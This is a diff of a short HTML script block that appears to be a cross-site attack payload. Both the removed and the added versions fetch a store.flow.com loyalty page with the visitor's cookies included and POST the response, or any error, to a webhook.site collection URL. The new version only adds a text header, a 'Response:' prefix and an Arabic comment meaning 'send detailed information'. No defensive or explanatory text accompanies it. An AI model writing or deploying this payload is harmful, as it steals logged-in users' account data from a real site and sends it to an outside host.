@@ -1,18 +1,25 @@
 <script>
-  fetch("https://store.flow.com/loyalty?discoveryItemSlug=84a68a66-4e8e-4dc3-ab7e-5fe56bd4de0c", {
-    credentials: "include"
-  })
-  .then(res => res.text())
-  .then(data => {
-    fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
-      method: "POST",
-      body: data
-    });
-  })
-  .catch(err => {
-    fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
-      method: "POST",
-      body: "Error: " + err.message
-    });
+fetch("https://store.flow.com/loyalty?discoveryItemSlug=84a68a66-4e8e-4dc3-ab7e-5fe56bd4de0c", {
+  credentials: "include"
+})
+.then(res => res.text())
+.then(data => {
+  // إرسال معلومات مفصلة
+  fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: "Response:\n" + data
   });
+})
+.catch(err => {
+  fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: "Error: " + err.message
+  });
+});
 </script>
